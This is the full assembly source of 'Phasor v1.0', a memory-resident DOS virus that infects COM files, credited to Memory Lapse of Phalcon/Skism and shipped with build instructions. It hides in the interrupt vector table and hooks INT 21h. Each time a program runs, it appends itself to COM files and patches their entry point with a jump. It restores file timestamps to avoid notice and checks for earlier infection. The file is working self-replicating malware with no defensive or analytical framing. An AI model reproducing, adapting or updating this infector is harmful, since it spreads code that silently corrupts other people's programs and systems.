;
; [Phasor] v1.0
; Written by Memory Lapse of Phalcon/Skism
;
; This is a simple memory resident, COM infector.  It hides in the unused
; portion of the interrupt table starting at 0:1E0h.
;
; To Assemble:
; TASM [PHASOR10]/m2 - TLINK [PHASOR10]/T
;
       .model   tiny                                  ;
       .code                                          ;
       .286                                           ;
        org     100h                                  ;
                                                      ;
start:                                                ;Mark Start of Code
v_start:                                              ;Mark Start of Virus
        mov     bp,0000h                              ;Self Modifying Delta
delta   equ     $-002h                                ; Offset.
                                                      ;
        xor     di,di                                 ;Load Register w/Zero
        mov     es,di                                 ;ES = 000h
                                                      ;
        mov     di,01E0h                              ;DI = 1E0h
                                                      ;
        cmp     byte ptr es:[di],0BDh                 ;Virus Present?
        jz      restoreCOMbytes                       ;(0BDh = MOV BP,XXXX)
                                                      ;
        push    cs                                    ;Save CS onto Stack
        pop     ds                                    ;Restore DS (CS=DS)
                                                      ;
        mov     cx,(heap_end-v_start)/002h            ;CX = # of Words To Copy
        lea     si,[bp+100h]                          ;SI = Start of Virus
        rep     movsw                                 ;Copy Virus To Int Table
                                                      ;
        mov     ax,offset i021h+0E0h                  ;AX = Handler + Offset
                                                      ;
        xchg    ax,word ptr es:[084h]                 ;Modify Interrupt Table
        mov     word ptr es:[i021hOffset+0E0h],ax     ; To Point To Virus's 
                                                      ; Interrupt 021h
        mov     ax,es                                 ; Handler.
                                                      ;
        xchg    ax,word ptr es:[086h]                 ;
        mov     word ptr es:[i021hSegment+0E0h],ax    ;
                                                      ;
restoreCOMbytes:                                      ;
        push    cs cs                                 ;Equal Out Segment
        pop     ds es                                 ; Registers.
                                                      ;
        lea     si,[bp+host_bytes]                    ;SI = Host's Bytes 
        mov     di,100h                               ;DI = Start of Host
        push    di                                    ;Save DI onto Stack
        mov     byte ptr [di],0C3h                    ;Write RET to Host
        call    di                                    ;Call 100h (RET)
                                                      ;
        movsb                                         ;Byte @ DS:[SI]=>ES:[DI]
        movsw                                         ;Word @ DS:[SI]=>ES:[DI]
                                                      ;
        retn                                          ;Return to Host Program.
                                                      ;
host_bytes      db      0CDh,020h,000h                ;Buffer For Starting of
                                                      ; Host Program.
infect: xor     bp,bp                                 ;Load Register w/Zero
                                                      ;
        mov     ax,3D00h                              ;AX = 3D00h
        int     021h                                  ;Open File in R/O Mode.
                                                      ;
        xchg    ax,bx                                 ;
                                                      ;
        push    bx cs cs                              ;Save Handle, Equal Out
        pop     ds es                                 ; Segment Registers.
                                                      ;
        mov     ax,1220h                              ;AX = 1220h
        int     02Fh                                  ;Get JFT.
                                                      ;
        mov     ax,1216h                              ;AX = 1216h
        mov     bl,byte ptr es:[di]                   ;BL = Location of SFT
        int     02Fh                                  ;Get SFT.
                                                      ;
        pop     bx                                    ;Restore File Handle
                                                      ;
        mov     word ptr es:[di+002h],002h            ;Open File For Read And
                                                      ; Write Mode.
        mov     ah,03Fh                               ;AH = 3Fh
        mov     cx,003h                               ;CX = # of Bytes To Read
        mov     dx,offset host_bytes+0E0h             ;DX = Buffer + Offset
        int     021h                                  ;Read 003h Bytes To Bufr
                                                      ;
        mov     si,dx                                 ;SI = DX
                                                      ;
        cmp     word ptr [si+000h],5A4Dh              ;EXE File?
        jz      closeCOMfile                          ;Exit Virus
                                                      ;
        cmp     word ptr [si+000h],4D5Ah              ;EXE File?
        jz      closeCOMfile                          ;Exit Virus
                                                      ;
        push    cx                                    ;Save CX onto Stack.
                                                      ;
        mov     ax,4202h                              ;AX = 4202h
        xor     cx,cx                                 ;Load Register w/Zero
        cwd                                           ;Load Register w/Zero
        int     021h                                  ;Move File Pointer @ EOF
                                                      ;
        pop     cx                                    ;Restore CX.
                                                      ;
        mov     word ptr [delta+0E0h],ax              ;Write Delta Offset
                                                      ;
        sub     ax,cx                                 ;Subtract 3h from Size.
        mov     byte ptr [temp_buffer+0E0h+000h],0E9h ;Write Jump to Buffer
        mov     word ptr [temp_buffer+0E0h+001h],ax   ;Write Location to Buffr
                                                      ;
        sub     ax,(v_end-v_start)                    ;Subtract Virus Length
                                                      ;
        cmp     word ptr [si+001h],ax                 ;Is File Infected?
        jz      closeCOMfile                          ;Jump if Infected.
                                                      ;
        mov     ah,040h                               ;AH = 40h
        mov     cx,(v_end-v_start)                    ;CX = # of Bytes to Wrte
        mov     dx,01E0h                              ;DX = Data to Write
        int     021h                                  ;Write To File.
                                                      ;
        mov     word ptr es:[di+015h],bp              ;Move File Pointer To
        mov     word ptr es:[di+017h],bp              ;Start of File.
                                                      ;
        mov     ah,040h                               ;AH = 40h
        mov     cx,003h                               ;CX = # of Bytes to Wrte
        mov     dx,offset temp_buffer+0E0h            ;DX = Data to Write
        int     021h                                  ;Write To File.
                                                      ;
        mov     ax,5701h                              ;AX = 5701h
        mov     cx,word ptr es:[di+00Dh]              ;CX = Time Stamp
        mov     dx,word ptr es:[di+00Fh]              ;DX = Date Stamp
        int     021h                                  ;Set Time.
                                                      ;
closeCOMfile:                                         ;
        mov     ah,03Eh                               ;AH = 3Eh
        int     021h                                  ;Close File.
                                                      ;
        jmp     exit                                  ;Unconditional Jump
                                                      ;
        db      "[ML/PS]"                             ;
                                                      ;
i021h:  pusha                                         ;Preserve All Regs.
        push    ds es                                 ;Save Segment Registers.
                                                      ;
        sub     ax,4B00h                              ;Executing A File?
        jnz     exit                                  ;Jump If Not 4B00h.
                                                      ;
        jmp     infect                                ;Unconditional Jump.

exit:   pop     es ds                                 ;Restore Segment Regs.
        popa                                          ;Restore All Registers.
                                                      ;
int21h: db      0EAh                                  ;JMP SSSS:OOOOO
                                                      ;
v_end:                                                ;End of Virus
heap_start:                                           ;Start of Heap
                                                      ;
i021hOffset     dw      001h dup (?)                  ;Buffer for Offset
i021hSegment    dw      001h dup (?)                  ;Buffer for Segment
                                                     
temp_buffer     db      003h dup (?)                  ;Buffer for Calculations
                                                      ;
heap_end:                                             ;End of Heap
                                                      ;
end     start                                         ;End of Source
